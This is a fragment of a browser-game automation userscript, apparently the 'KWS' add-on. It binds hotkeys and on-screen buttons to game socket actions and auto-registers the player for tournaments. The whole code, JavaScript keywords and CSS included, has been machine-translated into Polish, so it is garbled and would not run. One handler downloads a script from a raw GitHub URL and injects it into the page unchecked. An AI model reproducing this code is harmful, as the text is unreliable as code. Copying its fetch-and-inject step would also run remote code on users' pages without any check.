                        } else if (klucz zdarzenia === "3") {
                            GRA.socket.emit('ga', {
                                a: 39,
                                typ: 32
                            });
                        } else if (klucz zdarzenia === "4") {
                            to.bless();
                        } else if (klucz zdarzenia === "5") {
                            ustawCzasOkres(() => {
                                GRA.socket.emit('ga', {
                                    a: 54,
                                    typ: 0
                                });
                            }, 300);
                            ustawCzasOkres(() => {
                                to.vip();
                            }, 600);
                            GRA.socket.emit('ga', {
                                a: 15,
                                typ: 7
                            });
                        } else if (klucz zdarzenia === "6") {
                            GRA.socket.emit('ga', {
                                a: 39,
                                typ: 46,
                                czynsz: 3
                            });
                        } else if (klucz zdarzenia === "7") {
                            GRA.socket.emit('ga', {
                                a: 10,
                                typ: 2,
                                ilość sztuk: 0
                            });
                        } else if (klucz zdarzenia === "8") {
                            niech zestaw = $("#ekw_sets").find(".option.ek_sets_all" + ":not(.current)").attr("zestaw-danych");
                            jeśli (ustaw != niezdefiniowane) {
                                GRA.socket.emit('ga', {
                                    a: 64,
                                    typ: 2,
                                    zestaw: zestaw
                                });
                            }
                        } else if (klucz zdarzenia === "=") {
                            this.createAlternativePilot();
                        } else if (klucz zdarzenia === ",") {
                            this.goToPreviousChar();
                        } else if (klucz zdarzenia === ".") {
                            this.goToNextChar();
                        } else if (klucz zdarzenia === "9" && JQS.qcc.is(":visible")) { }
                    }
                });
                $("body").on("kliknij", ".qlink.load_afo", () => {
                    jeśli (typeof this.afo_is_loaded == 'niezdefiniowane') {
                        this.afo_is_loaded = prawda;
                        $.get("https://raw.githubusercontent.com/KWSforAll/KWSforAll/main/uncodedeeee.js", (dane) => {
                            $("ciało").append(`<script>${data}<\/script>`);
                        }).niepowodzenie(() => {
                            GAME.komunikat("Wykonaj błąd ładowania skryptu, odśwież stronę i sprróbuj ponownie!");
                        });
                    } w przeciwnym razie {
                        GAME.komunikat("Wykonaj błąd ładowania skryptu, odśwież stronę i sprróbuj ponownie!");
                    }
                });

                $("body").on("kliknij", ".qlink.go_to_emp", (el) => {
                    niech emp = parseInt($(el.target).attr("emp"));
                    GRA.socket.emit('ga', {
                        a: 50,
                        typ: 5,
                        e: emp
                    });
                });
                $("#kws_spawn").przeciągany({
                    uchwyt: ".sekcja"
                });
                $('.spawn_switch').on('kliknij', funkcja () {
                    $("#kws_spawn2").toggle();
                });
                $("#kws_spawn wejście[typ=pole wyboru], wejście[typ=tekst]").change((chb) => {
                    przełącz ($(chb.target).attr("name")) {
                        przypadek "ignoreMobs":
                            GAME.spawner[1] = $('#kws_spawn input[name="ignoreMobs"]').map((index, element) => {
                                zwróć element.checked ? 1 : 0;
                            }).Dostawać();
                            przerwa;
                        przypadek "usePaToSpawn":
                            to.aktualizacjaPaToSpawn($(chb.target).val());
                            przerwa;
                    }
                });
                $("#wtórny_char_stats").append(` <div class="instance" data-toggle="tooltip" data-original-title="<div class=tt>Instancje <br /><span class="red" ;><b>Kliknij przez wykonać instancje</b></span></div>" class=""><i class="ico a11"></i> <span> <ul><ul/></span></div> <div class="activities" data-toggle="tooltip" data-original-title="<div class=tt>Aktywni <br />< span class="red"><b>Kliknij by odebrać aktywnośni</b></span></div>" class=""><i class="ico a12"></i> < rozpiętość> <ul><ul/></span></div>`);
                $("body").on('change', '.autoExpeCodes input[type=checkbox]', (el) => {
                    niech nazwa = $(el.target).attr("nazwa");
                    jeśli (nazwa === 'aeCodes') {
                        this.settings.aeCodes = $(el.target).is(':checked') ? prawda : fałsz;
                    }
                    this.updateSettings();
                });
                $("body").on("kliknij", `.quest_roll1.option`, () => {
                    var id = parseInt($(".quest_roll.option").attr("data-qb_id"));
                    jeśli (rzut1) {
                        roll1 = fałsz;
                    } w przeciwnym razie {
                        roll1 = prawda;
                        GRA.socket.emit('ga', {
                            a: 22,
                            typ: 1,
                            Identyfikator: identyfikator
                        });
                    }
                });
                $("body").on("kliknij", `.quest_roll2.option`, () => {
                    var id = parseInt($(".quest_roll.option").attr("data-qb_id"));
                    jeśli (roll2) {
                        roll2 = fałsz
                    } w przeciwnym razie {
                        roll2 = prawda;
                        GRA.socket.emit('ga', {
                            a: 22,
                            typ: 1,
                            Identyfikator: identyfikator
                        });
                    }
                });
                $("body").on("kliknij", `.quest_roll3.option`, () => {
                    var id = parseInt($(".quest_roll.option").attr("data-qb_id"));
                    jeśli (roll3) {
                        roll3 = fałsz;
                    } w przeciwnym razie {
                        roll3 = prawda;
                        GRA.socket.emit('ga', {
                            a: 22,
                            typ: 1,
                            Identyfikator: identyfikator
                        });
                    }
                });
            }
            przygotujDaneStatystykPrzyszłości() {
                niech staty = GAME.char_data;
                jeśli(staty.reborn==0){
                    var moc=staty.sila+staty.szyb+staty.wytrz+staty.swoli+staty.ki;
                    var fb=Math.round(moc/10000000,3);
                    zwróć `${LNG.lab166} : <span class="orange">${GAME.dots(fb)</span>`;
                }
                jeśli(staty.reborn==1){
                    var expm=Math.round(staty.exp/5000),mocm=Math.round(staty.moc/10);
                    zmienna fb=expm+mocm;
                    zwróć `${LNG.lab167} : <span class="orange" id="future_wspol">${GAME.dots(fb)</span> [${LNG.lab217}: <span class="green">${GAME.dots(mocm)</span>, ${LNG.lab218}: <span class="green">${GAME.dots(expm)</span>]`;
                }
                jeśli(staty.reborn==2){
                    zmienna ps=0;
                    var moc=staty.sila+staty.szyb+staty.wytrz+staty.swoli+staty.ki;
                    var mocm=Math.round(moc/100000000000);
                    jeśli(mocm>1000) mocm=1000;
                    ps+=mocm;
                    var wsplm=Math.round(staty.reborn_bonus/100);
                    jeśli(wsplm>1000) wsplm=1000;
                    ps+=wsplm;
                    var fb=Math.round(staty.god/10000);
                    zwróć `${LNG.lab168} : <span class="orange">${GAME.dots(fb)</span> ${LNG.lab220} : <span class="orange">${GAME.dots(ps)</span> [${LNG.lab217}: <span class="green">${GAME.dots(mocm)</span>, ${LNG.lab219}: <span class="green">${GAME.dots(wsplm)</span>]`;
                }
                jeśli(staty.reborn==3){
                    zmienna gki=1000;
                    var wtam=Math.floor(staty.wta/100000000000);
                    gki+=wtam;
                    var moc=staty.sila+staty.szyb+staty.wytrz+staty.swoli+staty.ki;
                    var mocm1=Math.round(moc/10000000000000);
                    gki+=mocm1;
                    jeśli(gki>1000000) gki=1000000;
                    zmienna ps=10;
                    var levm=Math.floor(staty.level/200);
                    ps+=lewm;
                    var moc=staty.sila+staty.szyb+staty.wytrz+staty.swoli+staty.ki+staty.wta;
                    var mocm2=Math.floor(moc/10000000000000000);
                    ps+=mocm2;
                    jeśli(ps>150) ps=150;
                    zwróć `${LNG.lab169} : <span class="orange">${GAME.dots(gki)</span> [1000 + ${LNG.lab217}: <span class="green">${GAME.dots(mocm1)</span>, ${LNG.lab221}: <span class="green">${GAME.dots(wtam)</span>] ${LNG.lab170} : <span class="orange">${GAME.dots(ps)</span> [10+ ${LNG.lab217}: <span class="green">${GAME.dots(mocm2)</span>, ${LNG.lab222}: <span class="green">${GAME.dots(levm)</span>]`;
                }
                jeśli(staty.reborn==4){
                    zmienna ins=10;
                    var wtam=Math.floor(staty.wta/1000000000000);
                    ins+=wtam;
                    zmienna gkid=staty.gki/1000;
                    ins+=gkid;
                    jeśli(ins>100000) ins=100000;
                    zwróć `${LNG.lab434} : <span class="orange">${GAME.dots(ins)</span> [10 + ${LNG.lab435}: <span class="green">${GAME.dots(gkid)</span>, ${LNG.lab221}: <span class="green">${GAME.dots(wtam)</span>]`;
                }
            }
            handleAdditionalTopBarVisibility() {
                jeśli(this.additionalTopBarVisible) {
                    this.hideAdditionalTopBar();
                    this.additionalTopBarVisible = false;
                } w przeciwnym razie {
                    this.showAdditionalTopBar();
                    this.additionalTopBarVisible = prawda;
                }
            }
            zresetujObliczonąMoc() {
                this.baselinePower = niezdefiniowane;
                this.baselineLevel = niezdefiniowany;
            }
            pokażDodatkowyGórnyPasek() {
                $("#game_win")[0].style.marginTop = '30px';
                $("#top_bar")[0].style.height = '60px';
                $(".kws_additional_top_bar")[0].style.marginTop = '30px';
                $(".kws_additional_top_bar")[0].style.display = 'blok';
            }
            ukryjDodatkowyGórnyPasek() {
                $(".kws_additional_top_bar")[0].style.display = 'brak';
                $("#top_bar")[0].style.height = '30px';
                $("#game_win")[0].style.marginTop = '0px';
            }
            znajdźKategoriE Turnieju() {
                dla (typ var = 2; typ <= 2; typ++) {
                    dla (var kot = 1; kot <= 69; kot++) {
                        jeśli (GAME.isYourTourCat(typ, kot, GAME.char_data.reborn, GAME.char_data.level)) {
                            this.tournamentCategory = kot;
                        }
                    }
                }
            }
            sprawdźPodpisywanieTurniejów() {
                jeśli(this.isCheckingTournaments) { return; }
                this.isCheckingTournaments = prawda;
                var currentServerTime = nowa Data(GAME.getTime()*1000);
                var bieżącaGodzinaSerwera = bieżącyCzasSerwera.getHours();
                var bieżącaMinutaSerwera = bieżącyCzasSerwera.getMinutes();
                console.log("KWA_TOURNAMENTS: Sprawdź znak turniejowy");
                jeśli(bieżącaGodzinaSerwera > 20 || bieżącaGodzinaSerwera < 18) {
                    console.log("KWA_TOURNAMENTS: Błędne godziny, zresetuj wartości");
                    this.tourSigned = false;
                    this.tournamentCategory = niezdefiniowana;
                    this.newTournamentID = niezdefiniowane;
                    this.isCheckingTournaments = false;
                } w przeciwnym razie jeśli (!this.tourSigned) {
                    console.log("KWA_TOURNAMENTS: nie podpisano");
                    jeśli ((bieżącaGodzinaSerwera == 18 && bieżącaMinutaSerwera > 9) || (bieżącaGodzinaSerwera > 18 && bieżącaGodzinaSerwera < 21)) {
                        console.log("KWA_TOURNAMENTS: poprawny czas");
                        this.tourSigned = prawda;
                        this.findTournamentCategory();
                        console.log("KWA_TOURNAMENTS: pobrano kategorię turnieju");
                        ustawCzasOkres(() => {
                            console.log("KWA_TOURNAMENTS: pobierz identyfikatory turniejów");
                            jeśli (ta.kategoriaturniejowa <= 54) {
                                GAME.emitOrder({a: 57, typ: 0, typ2: 0, strona: 1});
                            } w przeciwnym razie {
                                GAME.emitOrder({a: 57, typ: 0, typ2: 0, strona: 2});
                            }
                        }, 500);
                        setTimeout(() => { console.log("KWA_TOURNAMENTS: zaloguj gracza");GAME.emitOrder({a: 57, type: 1, tid: this.newTournamentID}); }, 1000);
                        setTimeout(() => { console.log("KWA_TOURNAMENTS: zaloguj wszystkie zwierzęta");GAME.emitOrder({a: 57, type: 4}); }, 1500);
                        setTimeout(() => { console.log("KWA_TOURNAMENTS: wyczyść wyskakujące okienka");kom_clear(); }, 2000);
                        this.setTimerForTournamentsReset();
                    } w przeciwnym razie {
                        this.isCheckingTournaments = false;
                    }
                }
            }
            setTimerForTournamentsReset() {
                setTimeout(() => { this.isCheckingTournaments = false; }, 5000);
            }
            stwórzAlternatywnegoPilota() {
                document.getElementById('map_pilot').style.width = '512px';
                var customStyles = document.createElement('styl');
                customStyles.type = 'tekst/css';
                style.innerHTML = `
                    .qtrack {
                        szerokość: 410px !ważne;
                        rozmiar czcionki: 12px !ważne;
                    }
                    .qtrack silny {
                        rozmiar czcionki: 12px !ważne;
                    }
                    .zad. {
                        wyświetl: brak !ważne;
                    }
                    .kom {
                        tło: url(/gfx/layout/tloPilot.png) !ważne;
                        rozmiar-tła: okładka !ważne;
                        border-image: url(/gfx/layout/mapborder.png) 7 8 7 7 wypełnij !ważne;
                        border-style: solid !important;
                        szerokość obramowania: 7px 8px 7px 7px !ważne;
                        box-shadow: brak !ważne;
                    }
                    .kom .close_kom b {
                        tło: url(/gfx/layout/tloPilot.png) !ważne;
                    }
                    #kontener_wojenny {
                        pozycja: absolutna !ważna;
                        lewy: 10px !ważne;
                        góra: 565px !ważne;
                    }
                    #quest_con {
                        margin-top: -295px !ważne;
                        lewy: -510px !ważne;
                      }
                `;
                $("head").append(customStyles);
                var kwsHidePilotElement = document.getElementById('kws_hidePilot');
                var mapPilotElement = document.getElementById('map_pilot');
                jeśli (kwsHidePilotElement) {
                    kwsHidePilotElement.value = '1';
                    var changeEvent = nowe zdarzenie('change');
                    kwsHidePilotElement.dispatchEvent(changeEvent);
                    jeśli (kwsHidePilotElement.value === '1' && mapPilotElement) {
                        mapPilotElement.style.display = 'brak';
                    }
                    var clickEvent = new MouseEvent('click', { bąbelki: prawda, anulowalne: prawda, przycisk: 0 });
                    kwsHidePilotElement.dispatchEvent(wydarzeniekliknij);
                } w przeciwnym razie {
                    console.error('Element o identyfikatorze "kws_hidePilot" nie został znaleziony.');
                }
                var minimap = document.querySelector('#minimap_canvas');
                var gridCanvas = document.querySelector('#minimap_grid_canvas');
                var minimapLay = document.querySelector('.minimap_lay');
                zmienna kwsLocInfo = document.querySelector('#kws_locInfo');

                jeśli (minimapa) {
                    minimapa.style.lewy = '-15px';
                    minimap.style.top = '813px';
                }

                jeśli (siatkaCanvas) {
                    gridCanvas.style.left = '-15px';
                    gridCanvas.style.top = '813px';
                }

                jeśli (minimapLay) {
                    minimapLay.style.left = '-30px';
                    minimapLay.style.top = '802px';
                }

                jeśli (kwsLocInfo) {
                   // kwsLocInfo.style.left = '-235px';
                   // kwsLocInfo.style.top = '860px';
		  kwsLocInfo.style.left = '-35px';
		  kwsLocInfo.style.top = '1030px';                   
                }

                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:530px; lewa:144px; indeks z:999;'><button id='klawiszw' style='szerokość: 70px; wysokość: 70px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 50px;'>↑</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:530px; lewa:65px; indeks z:999;'><button id='klawiszq' style='szerokość: 70px; wysokość: 70px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 50px;'>Q</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='position:absolute; top:530px; left:225px; z-index:999;'><button id='klawisze' style='szerokość: 70px; wysokość: 70px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 50px;'>E</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:607px; lewa:144px; indeks z:999;'><button id='klawiszs' style='szerokość: 70px; wysokość: 70px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 50px;'>↓</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='position:absolute; top:607px; left:65px; z-index:999;'><button id='klawisza' style='szerokość: 70px; wysokość: 70px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 50px;'>←</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:607px; lewa:225px; indeks z:999;'><button id='klawiszd' style='szerokość: 70px; wysokość: 70px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 50px;'>→</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:684px; lewa:145px; indeks z:999;'><button id='klawiszx' style='szerokość: 70px; wysokość: 70px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 50px;'>x</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:684px; lewa:65px; indeks z:999;'><button id='klawiszz' style='szerokość: 70px; wysokość: 70px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 50px;'>Z</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:684px; lewa:225px; indeks z:999;'><button id='klawiszc' style='szerokość: 70px; wysokość: 70px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 50px;'>C</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:761px; lewa:100px; indeks z:999;'><button id='klawiszr' style='szerokość: 70px; wysokość: 70px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 50px;'>R</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');                 
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:761px; lewa:11px; indeks z:999;'><button id='klawiszy' style='szerokość: 70px; wysokość: 70px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 50px;'>Y</button></div>");                 
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:761px; lewa:189px; indeks z:999;'><button id='klawiszv' style='szerokość: 70px; wysokość: 70px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 50px;'>V</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                // akceptowalny obraz do kontenera
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:530px; lewa:310px; indeks z:999;'><button id='klawiszqx3' style='szerokość: 60px; wysokość: 60px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 16px;'>Qx5</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:530px; lewa:373px; indeks z:999;'><button id='klawiszwx3' style='szerokość: 60px; wysokość: 60px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 16px;;'>↑x5</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:530px; lewa:436px; indeks z:999;'><button id='klawiszex3' style='szerokość: 60px; wysokość: 60px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 16px;'>Ex5</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolutna; góra:595px; lewa:310px; indeks z:999;'><button id='klawiszax3' style='szerokość: 60px; wysokość:60px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: wskaźnik; rozmiar czcionki: 16px;'>←x5</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:595px; lewa:373px; indeks z:999;'><button id='klawiszsx3' style='szerokość: 60px; wysokość: 60px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 16px;'>x5↓</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolutna; góra:595px; lewa:436px; indeks z:999;'><button id='klawiszdx3' style='szerokość:60px; wysokość: 60px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: wskaźnik; rozmiar czcionki: 16px;'>→x5</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:660px; lewa:310px; indeks z:999;'><button id='klawiszzx3' style='szerokość: 60px; wysokość: 60px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 16px;'>Zx5</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:660px; lewa:436px; indeks z:999;'><button id='klawiszcx3' style='szerokość: 60px; wysokość: 60px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 16px;'>Cx5</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:730px; lewa:373px; indeks z:999;'><button id='klawiszvx3' style='szerokość: 60px; wysokość: 60px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 16px;'>Vx5</button></div>");
                $('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
                $('#map_canvas_container').append("<div style='pozycja:absolutna; góra:730px; lewa:310px; indeks z:999;'><button id='klawiszb5' style='szerokość:60px; wysokość: 60px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: wskaźnik; rozmiar czcionki: 16px;'>B</button></div>");
                $('#map_canvas_container').append("<div style='pozycja:absolute; góra:730px; lewa:436px; indeks z:999;'><button id='klawiszn' style='szerokość: 60px; wysokość: 60px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 16px;'>N</button></div>");
	$('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
	$('#map_canvas_container').append("<div style='pozycja:absolute; góra:851px; lewa:89px; indeks z:999;'><button id='klawisz1' style='szerokość: 50px; wysokość: 50px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 20px;'>1</button></div>");	
	$('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
	$('#map_canvas_container').append("<div style='pozycja:absolute; góra:851px; lewa:149px; indeks z:999;'><button id='klawisz2' style='szerokość: 50px; wysokość: 50px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 20px;'>2</button></div>");
	$('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
	$('#map_canvas_container').append("<div style='pozycja:absolute; góra:851px; lewa:209px; indeks z:999;'><button id='klawisz3' style='szerokość: 50px; wysokość: 50px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 20px;'>3</button></div>");	
	$('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
	$('#map_canvas_container').append("<div style='pozycja:absolute; góra:911px; lewa:89px; indeks z:999;'><button id='klawisz4' style='szerokość: 50px; wysokość: 50px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 20px;'>4</button></div>");
	$('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
	$('#map_canvas_container').append("<div style='pozycja:absolute; góra:911px; lewa:149px; indeks z:999;'><button id='klawisz5' style='szerokość: 50px; wysokość: 50px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 20px;'>5</button></div>");	
	$('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
	$('#map_canvas_container').append("<div style='pozycja:absolute; góra:911px; lewa:209px; indeks z:999;'><button id='klawisz6' style='szerokość: 50px; wysokość: 50px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 20px;'>6</button></div>");	
	$('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
	$('#map_canvas_container').append("<div style='pozycja:absolute; góra:971px; lewa:89px; indeks z:999;'><button id='klawisz7' style='szerokość: 50px; wysokość: 50px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 20px;'>7</button></div>");	
	$('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
	$('#map_canvas_container').append("<div style='pozycja:absolute; góra:971px; lewa:149px; indeks z:999;'><button id='klawisz 8' style='szerokość: 50px; wysokość: 50px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 20px;'>8</button></div>");
	$('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
	$('#map_canvas_container').append("<div style='pozycja:absolute; góra:971px; lewa:209px; indeks z:999;'><button id='klawisz9' style='szerokość: 50px; wysokość: 50px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 20px;'>9</button></div>");
	$('.clearfix').append('<div id="map_canvas_container" style="position:absolute; top:731px; left:59px; "></div>');
	$('#map_canvas_container').append("<div style='position:absolute; top:1031px; left:89px; z-index:999;'><button id='klawiszspacja' style='szerokość: 150px; wysokość: 50px; promień obramowania: 5px; obramowanie: 2px, jednolite białe; wypełnienie: 5px; kolor tła: czarny; kolor: biały; kursor: pointer; rozmiar czcionki: 20px;'>----------------</button></div>");									
                this.bindAlternativePilotButtons();
            }
            bindAlternativePilotButtons() {
			$('#klawiszspacja').click(() => {
			    const oryginalnyPilotUtwórzAlternatywnyPilot = utwórzAlternatywnyPilot;
			    funkcja createAlternativePilot() {
			    }

			    usuń window.createAlternativePilot;

			    $('#klawiszw, #klawiszy, #klawisz1, #klawisz2, #klawisz3, #klawisz4, #klawisz5, #klawisz6, #klawisz7, #klawisz8, #klawisz9, #klawiszq, #klawisze, #klawiszs, #klawisza, #klawiszd , #klawiszx, #klawisz, #klawiszc, #klawiszr, #klawiszy, #klawiszv, #klawiszqx3, #klawiszwx3, #klawiszx3, #klawiszax3, #klawiszsx3, #klawiszdx3, #klawiszzx3, #klawiszcx3, #klawiszvx3, #klawiszb5, #klawiszspacja, #klawiszn').remove() ;

			    var kwsHidePilotElement = document.getElementById('kws_hidePilot');
			    var mapPilotElement = document.getElementById('map_pilot');
			    jeśli (kwsHidePilotElement) {
				kwsHidePilotElement.value = '0';
				var changeEvent = nowe zdarzenie('change');
				kwsHidePilotElement.dispatchEvent(changeEvent);
				jeśli (kwsHidePilotElement.value === '0' && mapPilotElement) {
				    mapPilotElement.style.display = 'blok';
				}
				var clickEvent = new MouseEvent('click', { bąbelki: prawda, anulowalne: prawda, przycisk: 0 });
				kwsHidePilotElement.dispatchEvent(wydarzeniekliknij);
			    }
			    createAlternativePilot = oryginalnyCreateAlternativePilot;
			});
      
                $('#klawiszw').click(() => {
                    GAME.map_move(2) // klawisz 'w'
                });
 		  $('#klawisz1').click(() => {
		  var keyEvent = jQuery.Event('keydown');
		  zdarzenie kluczowe.które = 49; // Kod klawisza '1'
		  $(document).trigger(wydarzeniekluczowe);
		});	
		$('#klawisz2').click(() => {
		    GRA.socket.emit('ga', {
			a: 15,
			typ: 13
		    });
		});

		$('#klawisz3').click(() => {
		    GRA.socket.emit('ga', {
			a: 39,
			typ: 32
		    });
		});

		$('#klawisz4').click(() => {
		    to.bless();
		});

		$('#klawisz5').click(() => {
		    ustawCzasOkres(() => {
			GRA.socket.emit('ga', {
			    a: 54,
			    typ: 0
			});
		    }, 300);
		    ustawCzasOkres(() => {
			to.vip();
		    }, 600);
		    GRA.socket.emit('ga', {
			a: 15,
			typ: 7
		    });
		});

		$('#klawisz6').click(() => {
		    GRA.socket.emit('ga', {
			a: 39,
			typ: 46,
			czynsz: 3
		    });
		});

		$('#klawisz7').click(() => {
		    GRA.socket.emit('ga', {
			a: 10,
			typ: 2,
			ilość sztuk: 0
		    });
		});

		$('#klawisz8').click(() => {
		    niech zestaw = $("#ekw_sets").find(".option.ek_sets_all" + ":not(.current)").attr("zestaw-danych");
